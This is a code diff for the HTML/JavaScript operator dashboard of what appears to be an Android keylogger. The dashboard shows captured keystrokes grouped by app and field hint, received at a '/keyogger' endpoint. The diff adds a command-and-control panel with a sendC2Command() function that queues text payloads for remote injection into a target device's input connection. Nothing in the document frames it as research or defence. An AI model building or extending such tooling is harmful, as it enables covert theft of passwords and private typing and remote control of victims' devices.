@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,6 +8,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
+
 <body class="bg-slate-950 text-slate-100 font-sans min-h-screen flex flex-col">
 
     <!-- Top Navigation -->
@@ -21,11 +23,13 @@
             </div>
         </div>
         <div class="flex items-center space-x-4">
-            <div class="flex items-center space-x-2 bg-slate-950 px-3 py-1.5 rounded-full border border-slate-800 text-xs">
+            <div
+                class="flex items-center space-x-2 bg-slate-950 px-3 py-1.5 rounded-full border border-slate-800 text-xs">
                 <span id="conn-dot" class="h-2.5 w-2.5 rounded-full bg-amber-500 animate-pulse"></span>
                 <span id="conn-text" class="text-slate-300 font-medium">Connecting...</span>
             </div>
-            <button id="refresh-btn" onclick="fetchLogs()" class="bg-slate-800 hover:bg-slate-700 text-xs px-3 py-1.5 rounded border border-slate-700 transition flex items-center space-x-1">
+            <button id="refresh-btn" onclick="fetchLogs()"
+                class="bg-slate-800 hover:bg-slate-700 text-xs px-3 py-1.5 rounded border border-slate-700 transition flex items-center space-x-1">
                 <i class="fa-solid fa-rotate"></i>
                 <span>Refresh Logs</span>
             </button>
@@ -55,6 +59,25 @@
             </div>
         </div>
 
+        <!-- Remote Control / C2 Command Section -->
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-md space-y-3">
+            <div class="flex items-center space-x-2 text-red-400">
+                <i class="fa-solid fa-wand-magic-sparkles"></i>
+                <h2 class="font-semibold text-sm text-slate-200">Active C2 Remote Input Injection</h2>
+            </div>
+            <p class="text-xs text-slate-400">Queue text payloads to be remotely injected via the active InputConnection
+                on the target device.</p>
+            <div class="flex space-x-3">
+                <input type="text" id="c2-payload-input" placeholder="Enter text payload to inject..."
+                    class="flex-1 bg-slate-950 border border-slate-800 text-xs px-3 py-2 rounded text-slate-300 focus:outline-none focus:border-red-500/50 font-mono">
+                <button onclick="sendC2Command()"
+                    class="bg-red-600 hover:bg-red-500 text-xs px-4 py-2 rounded font-medium text-white transition flex items-center space-x-1.5 shadow-sm">
+                    <i class="fa-solid fa-paper-plane"></i>
+                    <span>Push to Device</span>
+                </button>
+            </div>
+        </div>
+
         <!-- Telemetry Data Table Section -->
         <div class="bg-slate-900 border border-slate-800 rounded-xl shadow-md overflow-hidden flex flex-col">
             <div class="px-6 py-4 border-b border-slate-800 flex justify-between items-center bg-slate-900/50">
@@ -63,14 +86,16 @@
                     <h2 class="font-semibold text-sm">Aggregated Session Stream</h2>
                 </div>
                 <div class="flex items-center space-x-2">
-                    <input type="text" id="search-filter" placeholder="Filter by app or hint..." onkeyup="filterTable()" class="bg-slate-950 border border-slate-800 text-xs px-3 py-1.5 rounded text-slate-300 focus:outline-none focus:border-slate-600">
+                    <input type="text" id="search-filter" placeholder="Filter by app or hint..." onkeyup="filterTable()"
+                        class="bg-slate-950 border border-slate-800 text-xs px-3 py-1.5 rounded text-slate-300 focus:outline-none focus:border-slate-600">
                 </div>
             </div>
 
             <!-- Table Container -->
             <div class="overflow-x-auto flex-1 max-h-[500px]">
                 <table class="w-full text-left border-collapse text-xs">
-                    <thead class="bg-slate-950 text-slate-400 uppercase tracking-wider sticky top-0 border-b border-slate-800">
+                    <thead
+                        class="bg-slate-950 text-slate-400 uppercase tracking-wider sticky top-0 border-b border-slate-800">
                         <tr>
                             <th class="px-4 py-3">Last Active</th>
                             <th class="px-4 py-3">Session ID</th>
@@ -82,7 +107,8 @@
                     </thead>
                     <tbody id="log-table-body" class="divide-y divide-slate-800/60 font-mono">
                         <tr>
-                            <td colspan="6" class="px-4 py-8 text-center text-slate-500 italic">No telemetry data recorded yet. Send requests to /keyogger.</td>
+                            <td colspan="6" class="px-4 py-8 text-center text-slate-500 italic">No telemetry data
+                                recorded yet. Send requests to /keyogger.</td>
                         </tr>
                     </tbody>
                 </table>
@@ -95,6 +121,29 @@
         let logsData = [];
         const API_URL = "/logs";
 
+        async function sendC2Command() {
+            const input = document.getElementById("c2-payload-input");
+            const text = input.value.trim();
+            if (!text) return; // Silent return if empty instead of alerting
+
+            try {
+                const response = await fetch("/queue-command", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ text: text })
+                });
+                const result = await response.json();
+                if (result.status === "success") {
+                    input.value = "";
+                    console.log("Payload successfully queued for remote injection.");
+                } else {
+                    console.error("Failed to queue payload.");
+                }
+            } catch (err) {
+                console.error("C2 Error:", err);
+            }
+        }
+
         async function fetchLogs() {
             const dot = document.getElementById("conn-dot");
             const text = document.getElementById("conn-text");
@@ -102,13 +151,13 @@
             try {
                 const response = await fetch(API_URL);
                 if (!response.ok) throw new Error("Server responded with status " + response.status);
-                
+
                 const result = await response.json();
                 if (result.status === "success" && Array.isArray(result.data)) {
                     logsData = result.data;
                     renderTable(logsData);
                     updateMetrics(logsData);
-                    
+
                     dot.className = "h-2.5 w-2.5 rounded-full bg-emerald-500";
                     text.innerText = "Connected (Live SQLite)";
                 }
@@ -127,7 +176,7 @@
                     method: 'DELETE'
                 });
                 if (!response.ok) throw new Error("Failed to delete session");
-                
+
                 // Refresh data immediately after deletion
                 fetchLogs();
             } catch (err) {
@@ -175,7 +224,7 @@
 
         function filterTable() {
             const query = document.getElementById("search-filter").value.toLowerCase();
-            const filtered = logsData.filter(d => 
+            const filtered = logsData.filter(d =>
                 (d.app_name && d.app_name.toLowerCase().includes(query)) ||
                 (d.field_hint && d.field_hint.toLowerCase().includes(query)) ||
                 (d.grouped_keys && d.grouped_keys.toLowerCase().includes(query))
@@ -192,4 +241,5 @@
         setInterval(fetchLogs, 3000);
     </script>
 </body>
+
 </html>
